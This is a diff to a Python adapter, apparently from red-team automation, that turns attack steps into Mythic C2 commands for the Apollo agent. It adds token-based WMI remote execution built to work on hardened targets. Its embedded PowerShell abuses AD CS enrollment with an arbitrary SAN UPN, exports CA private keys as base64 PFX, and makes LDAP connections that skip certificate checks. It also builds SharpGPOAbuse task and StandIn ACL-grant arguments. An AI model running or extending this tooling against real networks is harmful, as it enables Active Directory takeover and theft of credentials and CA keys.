@@ -128,7 +128,22 @@ MERLIN_MYTHIC_ADAPTER: dict[str, Any] = {
     "suppress_remote_file_read": True,
 }
 
+APOLLO_MYTHIC_ADAPTER: dict[str, Any] = {
+    "payload_type": "apollo",
+    # Apollo's explicit-credential wmiexecute path uses System.Management and can
+    # activate DCOM below packet integrity on hardened targets. The token branch
+    # uses Apollo's manual CoCreateInstanceEx path with PKT_PRIVACY and survives
+    # the same hardening policy.
+    "local_admin_remote_exec_command": "wmiexecute",
+    "local_admin_remote_exec_use_token_context": True,
+    "adcs_ca_export_use_token_context": True,
+    "local_admin_context_command": "make_token",
+    "make_token_use_credential_object": True,
+    "local_admin_remote_exec_cleanup_command": "rev2self",
+}
+
 _PAYLOAD_TYPE_ADAPTERS: dict[str, dict[str, Any]] = {
+    "apollo": APOLLO_MYTHIC_ADAPTER,
     "merlin": MERLIN_MYTHIC_ADAPTER,
 }
 
@@ -321,7 +336,10 @@ def _translate_step(step: Any, config: dict[str, Any]) -> MythicCapabilityComman
             step,
             config,
             _text(parameters.get("tool")),
-            " ".join(["--object", _quote_cli(parameters.get("target_dn")), "--ntacl"]),
+            _standin_acl_read_args(
+                _text(parameters.get("target_dn")),
+                _text(parameters.get("principal")),
+            ),
         )
     if operation == "drsuapi-dcsync":
         return _drsuapi_dcsync_command(step, config)
@@ -1006,6 +1024,11 @@ def _kerberos_logon_session_create_command(step: Any, config: dict[str, Any]) ->
     username = f"{domain}\\{user}" if domain and "\\" not in user and "@" not in user else user
     netonly_param = _adapter_text(config, "logon_netonly_param", "netOnly")
     credential_param = _adapter_text(config, "logon_credential_param", "credential")
+    logon_credential_id = _text(
+        parameters.get("logon_credential_id")
+        or parameters.get("netonly_credential_id")
+        or parameters.get("sacrificial_credential_id")
+    )
     mode = _normalize(config.get("logon_session_mode") or config.get("logon_strategy") or "credential-store")
     mythic_parameters: dict[str, Any] = {}
     if mode in {"direct", "username-password", "newcredentials"} or not credential_param:
@@ -1016,12 +1039,22 @@ def _kerberos_logon_session_create_command(step: Any, config: dict[str, Any]) ->
         if netonly_param:
             mythic_parameters[netonly_param] = bool(parameters.get("netonly", True))
     else:
-        mythic_parameters[credential_param] = {
-            "account": user,
-            "realm": domain,
-            "credential": password,
-            "type": "plaintext",
-        }
+        mythic_parameters[credential_param] = (
+            {
+                "id": logon_credential_id,
+                "account": user,
+                "realm": domain,
+                "credential": password,
+                "type": "plaintext",
+            }
+            if logon_credential_id
+            else {
+                "account": user,
+                "realm": domain,
+                "credential": password,
+                "type": "plaintext",
+            }
+        )
         if netonly_param:
             mythic_parameters[netonly_param] = bool(parameters.get("netonly", True))
     process_param = _adapter_text(config, "logon_process_param", "")
@@ -1537,6 +1570,11 @@ def _local_admin_logon_session_create_command(step: Any, config: dict[str, Any])
     username = f"{realm}\\{local_account}" if realm and "\\" not in local_account and "@" not in local_account else local_account
     netonly_param = _adapter_text(config, "logon_netonly_param", "netOnly")
     credential_param = _adapter_text(config, "logon_credential_param", "credential")
+    credential_id = _text(
+        parameters.get("local_admin_credential_id")
+        or parameters.get("managed_local_admin_credential_id")
+        or parameters.get("credential_id")
+    )
     mode = _normalize(config.get("logon_session_mode") or config.get("local_admin_logon_mode") or "credential-store")
     mythic_parameters: dict[str, Any]
     if mode in {"direct", "username-password", "newcredentials"} or not credential_param:
@@ -1548,12 +1586,22 @@ def _local_admin_logon_session_create_command(step: Any, config: dict[str, Any])
             mythic_parameters[netonly_param] = bool(parameters.get("netonly", True))
     else:
         mythic_parameters = {
-            credential_param: {
-                "account": local_account,
-                "realm": realm,
-                "credential": password,
-                "type": "plaintext",
-            },
+            credential_param: (
+                {
+                    "id": credential_id,
+                    "account": local_account,
+                    "realm": realm,
+                    "credential": password,
+                    "type": "plaintext",
+                }
+                if credential_id
+                else {
+                    "account": local_account,
+                    "realm": realm,
+                    "credential": password,
+                    "type": "plaintext",
+                }
+            ),
         }
         if netonly_param:
             mythic_parameters[netonly_param] = bool(parameters.get("netonly", True))
@@ -1657,6 +1705,20 @@ def _local_admin_remote_command(step: Any, config: dict[str, Any]) -> MythicCapa
             missing=["local_admin_remote_exec_command"],
             reason="local-admin remote execution adapter needs a Mythic command",
         )
+    if (
+        _normalize(command) in {"wmiexec", "wmiexecute"}
+        and _input_bool(config, "local_admin_remote_exec_use_token_context", default=False)
+    ):
+        return _local_admin_token_wmiexecute_commands(
+            step,
+            config,
+            parameters,
+            command,
+            host,
+            local_account,
+            password,
+            command_text,
+        )
     if _normalize(command) in {"execute_assembly", "inline_assembly", "execute-assembly"}:
         tool_name = _adapter_text(config, "remote_exec_tool", "SharpExec.exe")
         method = _normalize(parameters.get("method") or "wmiexec")
@@ -1719,6 +1781,61 @@ def _local_admin_remote_command(step: Any, config: dict[str, Any]) -> MythicCapa
     return MythicCapabilityCommandPlan(True, commands=[
         _command_from_step(step, command, mythic_parameters, produces=["remote_process_created"]),
     ])
+
+
+def _local_admin_token_wmiexecute_commands(
+    step: Any,
+    config: dict[str, Any],
+    parameters: dict[str, Any],
+    command: str,
+    host: str,
+    local_account: str,
+    password: str,
+    command_text: str,
+    *,
+    expected_probe: str | None = None,
+    purpose: str | None = None,
+) -> MythicCapabilityCommandPlan:
+    realm = _text(parameters.get("local_realm") or parameters.get("realm") or _short_host(host))
+    principal = local_account if ("\\" in local_account or "@" in local_account) else f"{realm}\\{local_account}"
+    capability = _text(getattr(step, "capability", ""))
+    prerequisites = list(getattr(step, "prerequisites", []) or [])
+    commands: list[MythicCapabilityCommand] = []
+    if not _input_bool(config, "local_admin_remote_exec_reuse_token_context", default=False):
+        make_token = _adapter_text(config, "local_admin_context_command", _adapter_text(config, "make_token_command", "make_token"))
+        if not make_token:
+            return MythicCapabilityCommandPlan(
+                False,
+                missing=["local_admin_context_command"],
+                reason="token-backed Apollo WMI execution needs a local-admin context command",
+            )
+        commands.append(
+            MythicCapabilityCommand(
+                command=make_token,
+                parameters=_make_token_parameters(config, principal, local_account, realm, password),
+                capability=capability,
+                purpose="create a network logon context for hardened Apollo WMI activation",
+                expected_probe="",
+                prerequisites=prerequisites,
+                produces=["local_admin_logon_context"],
+            )
+        )
+    commands.append(
+        MythicCapabilityCommand(
+            command=command,
+            parameters={
+                _adapter_text(config, "remote_exec_command_param", "command"): command_text,
+                _adapter_text(config, "remote_exec_host_param", "host"): host,
+            },
+            capability=capability,
+            purpose=_text(getattr(step, "purpose", "")) if purpose is None else purpose,
+            expected_probe=_text(getattr(step, "expected_probe", "")) if expected_probe is None else expected_probe,
+            prerequisites=prerequisites,
+            consumes=["local_admin_logon_context"],
+            produces=["remote_process_created"],
+        )
+    )
+    return MythicCapabilityCommandPlan(True, commands=commands)
 
 
 def _native_windows_remote_exec_run_commands(
@@ -2197,7 +2314,7 @@ def _remote_file_read_command(step: Any, config: dict[str, Any]) -> MythicCapabi
             reason="remote file read adapter needs a Mythic command",
         )
     path_param = _adapter_text(config, "remote_file_read_path_param", _adapter_text(config, "file_read_path_param", "path"))
-    return MythicCapabilityCommandPlan(True, commands=[
+    commands = [
         _command_from_step(
             step,
             command,
@@ -2206,7 +2323,28 @@ def _remote_file_read_command(step: Any, config: dict[str, Any]) -> MythicCapabi
             produces=["remote_execution_proof"],
             deferred="{{" in path,
         ),
-    ])
+    ]
+    commands.extend(_local_admin_cleanup_commands(step, config))
+    return MythicCapabilityCommandPlan(True, commands=commands)
+
+
+def _local_admin_cleanup_commands(step: Any, config: dict[str, Any]) -> list[MythicCapabilityCommand]:
+    cleanup_command = _adapter_text(config, "local_admin_remote_exec_cleanup_command", "")
+    if not cleanup_command:
+        return []
+    return [
+        MythicCapabilityCommand(
+            command=cleanup_command,
+            parameters={},
+            capability=_text(getattr(step, "capability", "")),
+            purpose="revert from the local-admin network logon context after proof readback",
+            expected_probe="",
+            operation="local-admin-logon-session-revert",
+            prerequisites=[],
+            consumes=["local_admin_logon_context"],
+            produces=[],
+        )
+    ]
 
 
 def _endpoint_protection_adjustment_command(step: Any, config: dict[str, Any]) -> MythicCapabilityCommandPlan:
@@ -2551,6 +2689,42 @@ def _adcs_ca_private_key_export_command(step: Any, config: dict[str, Any]) -> My
         encoded = base64.b64encode(remote_script.encode("utf-16le")).decode("ascii")
         remote_command = "powershell.exe -NoProfile -ExecutionPolicy Bypass -EncodedCommand " + encoded
         metadata_unc = _unc_from_windows_path(host, metadata_path)
+        if _input_bool(
+            config,
+            "adcs_ca_export_use_token_context",
+            default=_input_bool(config, "local_admin_remote_exec_use_token_context", default=False),
+        ):
+            token_plan = _local_admin_token_wmiexecute_commands(
+                step,
+                config,
+                parameters,
+                command,
+                host,
+                local_account,
+                password,
+                remote_command,
+                expected_probe="",
+                purpose=f"launch ADCS CA private-key export on {target_host}@{target_domain}",
+            )
+            if not token_plan.ok:
+                return token_plan
+            commands = list(token_plan.commands)
+            commands.append(
+                MythicCapabilityCommand(
+                    command=_adapter_text(config, "remote_file_read_command", _adapter_text(config, "file_read_command", "cat")),
+                    parameters={
+                        _adapter_text(config, "remote_file_read_path_param", _adapter_text(config, "file_read_path_param", "path")): metadata_unc,
+                    },
+                    capability=capability,
+                    purpose=f"read ADCS CA export metadata and PFX material from {metadata_unc}",
+                    expected_probe="extract_adcs_ca_private_key_probe",
+                    prerequisites=prerequisites,
+                    consumes=["local_admin_logon_context", "remote_process_created"],
+                    produces=["adcs_ca_private_key_material"],
+                )
+            )
+            commands.extend(_local_admin_cleanup_commands(step, config))
+            return MythicCapabilityCommandPlan(True, commands=commands)
         return MythicCapabilityCommandPlan(True, commands=[
             MythicCapabilityCommand(
                 command=command,
@@ -2832,20 +3006,20 @@ def _adcs_esc_certificate_enroll_powershell(
             "Set-Content -LiteralPath $inf -Value $infLines -Encoding ASCII;"
             "$newOut=& certreq.exe -new $inf $req 2>&1;"
             "$lines.Add('CERTREQ_NEW_OUTPUT_BEGIN');"
-            "$lines.AddRange([string[]]($newOut|ForEach-Object{[string]$_}));"
+            "if($null -ne $newOut){$lines.AddRange([string[]]($newOut|ForEach-Object{[string]$_}))};"
             "$lines.Add('CERTREQ_NEW_OUTPUT_END');"
             "if(-not (Test-Path -LiteralPath $req)){throw 'certreq -new did not create a request'};"
             "$attrib='CertificateTemplate:'+$template+[Environment]::NewLine+'SAN:upn='+$upn;"
             "$submitOut=& certreq.exe -submit -config $ca -attrib $attrib $req $cer 2>&1;"
             "$lines.Add('CERTREQ_SUBMIT_OUTPUT_BEGIN');"
-            "$lines.AddRange([string[]]($submitOut|ForEach-Object{[string]$_}));"
+            "if($null -ne $submitOut){$lines.AddRange([string[]]($submitOut|ForEach-Object{[string]$_}))};"
             "$lines.Add('CERTREQ_SUBMIT_OUTPUT_END');"
             "$submitText=($submitOut -join [Environment]::NewLine);"
             "if($submitText -match '(?i)requestid\\s*[:=]?\\s*(\\d+)'){$lines.Add(('CERT_REQUEST_ID='+$matches[1]))};"
             "if(-not (Test-Path -LiteralPath $cer)){throw 'certreq -submit did not return an issued certificate'};"
             "$acceptOut=& certreq.exe -accept $cer 2>&1;"
             "$lines.Add('CERTREQ_ACCEPT_OUTPUT_BEGIN');"
-            "$lines.AddRange([string[]]($acceptOut|ForEach-Object{[string]$_}));"
+            "if($null -ne $acceptOut){$lines.AddRange([string[]]($acceptOut|ForEach-Object{[string]$_}))};"
             "$lines.Add('CERTREQ_ACCEPT_OUTPUT_END');"
             "$cert=Get-ChildItem -Path Cert:\\CurrentUser\\My | Where-Object { $_.HasPrivateKey -and "
             "(($_.Subject -like ('*CN='+$account+'*')) -or ($_.Subject -like ('*'+$account+'*'))) } "
@@ -2853,9 +3027,8 @@ def _adcs_esc_certificate_enroll_powershell(
             "if(-not $cert){$cert=Get-ChildItem -Path Cert:\\CurrentUser\\My | Where-Object { $_.HasPrivateKey } "
             "| Sort-Object NotBefore -Descending | Select-Object -First 1};"
             "if(-not $cert){throw 'issued certificate with private key not found in CurrentUser store'};"
-            "$secure=ConvertTo-SecureString $pfxSecret -AsPlainText -Force;"
-            "Export-PfxCertificate -Cert $cert -FilePath $pfxPath -Password $secure -Force|Out-Null;"
-            "$bytes=[IO.File]::ReadAllBytes($pfxPath);"
+            "$bytes=$cert.Export([System.Security.Cryptography.X509Certificates.X509ContentType]::Pfx,$pfxSecret);"
+            "[IO.File]::WriteAllBytes($pfxPath,$bytes);"
             "$sha=[BitConverter]::ToString([Security.Cryptography.SHA256]::Create().ComputeHash($bytes)).Replace('-','').ToLowerInvariant();"
             "$lines.Add('CERT_ENROLL_STATUS=OK');"
             "$lines.Add(('CERT_SUBJECT='+$cert.Subject));"
@@ -3042,6 +3215,7 @@ def _certificate_schannel_ldap_powershell(
             "$candidate.AuthType=[System.DirectoryServices.Protocols.AuthType]::External;"
             "$candidate.SessionOptions.SecureSocketLayer=[bool]$attempt.Ssl;"
             "$candidate.SessionOptions.ProtocolVersion=3;"
+            "$candidate.SessionOptions.ReferralChasing=[System.DirectoryServices.Protocols.ReferralChasingOptions]::None;"
             "$candidate.SessionOptions.VerifyServerCertificate={param($connection,$certificate) $true};"
             "$candidate.SessionOptions.QueryClientCertificate={param($connection,$trustedCAs) $clientCert};"
             "$null=$candidate.ClientCertificates.Add($cert);"
@@ -3298,9 +3472,10 @@ def _adcs_ca_certutil_backup_remote_powershell(
             "$bytes=[IO.File]::ReadAllBytes($pfx.FullName);"
             "$exportedCert=New-Object System.Security.Cryptography.X509Certificates.X509Certificate2($pfx.FullName,$pfxSecret);"
             "$sha=[BitConverter]::ToString([Security.Cryptography.SHA256]::Create().ComputeHash($bytes)).Replace('-','').ToLowerInvariant();"
+            "$artifactId=[guid]::NewGuid().ToString();"
             "$lines+=@('CA_EXPORT_STATUS=OK',('CA_SUBJECT='+$exportedCert.Subject),('CA_ISSUER='+$exportedCert.Issuer),"
             "('CA_THUMBPRINT='+$exportedCert.Thumbprint),('CA_PFX_PATH='+$pfx.FullName),('PFX_SHA256='+$sha),"
-            "('PFX_BASE64='+[Convert]::ToBase64String($bytes)));"
+            "('PFX_ARTIFACT_ID='+$artifactId),('PFX_BASE64='+[Convert]::ToBase64String($bytes)));"
             "Set-Content -LiteralPath $metaPath -Value $lines -Encoding ASCII;"
             "}catch{"
             "$msg=$_.Exception.Message -replace \"`r|`n\",' ';"
@@ -3334,7 +3509,8 @@ def _adcs_ca_export_remote_powershell(
         "$exportedCert=New-Object System.Security.Cryptography.X509Certificates.X509Certificate2($pfxPath,$pfxSecret)",
         "$bytes=[IO.File]::ReadAllBytes($pfxPath)",
         "$sha=[BitConverter]::ToString([Security.Cryptography.SHA256]::Create().ComputeHash($bytes)).Replace('-','').ToLowerInvariant()",
-        "$lines+=@('CA_EXPORT_STATUS=OK',('CA_SUBJECT='+$exportedCert.Subject),('CA_ISSUER='+$exportedCert.Issuer),('CA_THUMBPRINT='+$exportedCert.Thumbprint),('CA_PFX_PATH='+$pfxPath),('PFX_SHA256='+$sha),('PFX_BASE64='+[Convert]::ToBase64String($bytes)))",
+        "$artifactId=[guid]::NewGuid().ToString()",
+        "$lines+=@('CA_EXPORT_STATUS=OK',('CA_SUBJECT='+$exportedCert.Subject),('CA_ISSUER='+$exportedCert.Issuer),('CA_THUMBPRINT='+$exportedCert.Thumbprint),('CA_PFX_PATH='+$pfxPath),('PFX_SHA256='+$sha),('PFX_ARTIFACT_ID='+$artifactId),('PFX_BASE64='+[Convert]::ToBase64String($bytes)))",
         "Set-Content -LiteralPath $metaPath -Value $lines -Encoding ASCII",
         "}catch{",
         "$msg=$_.Exception.Message -replace \"`r|`n\",' '",
@@ -3620,9 +3796,17 @@ def _sharp_gpo_task_args(parameters: dict[str, Any]) -> str:
         "--TaskName", _quote_cli(parameters.get("task_name")),
         "--Author", _quote_cli(parameters.get("author") or "NT AUTHORITY\\SYSTEM"),
         "--Command", _quote_cli(parameters.get("command")),
-        "--Arguments", _quote_cli(parameters.get("arguments")),
-        "--GPOName", _quote_cli(parameters.get("gpo")),
     ]
+    arguments = _text(parameters.get("arguments"))
+    if arguments.lstrip().startswith("-"):
+        # CommandLineParser 1.x treats a following `--foo` token as a new outer option,
+        # even when Apollo preserved it as one quoted argv value. Bind option-like inner
+        # command lines with the long-option `=` form so SharpGPOAbuse receives them as
+        # the `--Arguments` value instead of rejecting StandIn-style flags.
+        pieces.append(_quote_cli("--Arguments=" + arguments))
+    else:
+        pieces.extend(["--Arguments", _quote_cli(arguments)])
+    pieces.extend(["--GPOName", _quote_cli(parameters.get("gpo"))])
     if parameters.get("force", True) is not False:
         pieces.append("--Force")
     return " ".join(pieces)
@@ -3844,10 +4028,29 @@ def _ps_encoded_command(script: str) -> str:
 
 def _standin_grant_args(target_dn: str, principal: str, guid: str) -> str:
     return " ".join([
-        "--object", _quote_cli(target_dn),
+        "--object", _quote_cli(_standin_object_filter(target_dn)),
         "--grant", _quote_cli(principal),
         "--guid", _quote_cli(guid),
     ])
+
+
+def _standin_acl_read_args(target_dn: str, principal: str = "") -> str:
+    pieces = [
+        "--object", _quote_cli(_standin_object_filter(target_dn)),
+        "--access",
+    ]
+    if principal:
+        pieces.extend(["--ntaccount", _quote_cli(principal)])
+    return " ".join(pieces)
+
+
+def _standin_object_filter(target_dn: str) -> str:
+    text = _text(target_dn).strip()
+    if text.casefold().startswith("distinguishedname="):
+        return text
+    if text.casefold().startswith("dc="):
+        return "distinguishedname=" + text
+    return text
 
 
 def _adapter_text(config: dict[str, Any], key: str, default: str) -> str:
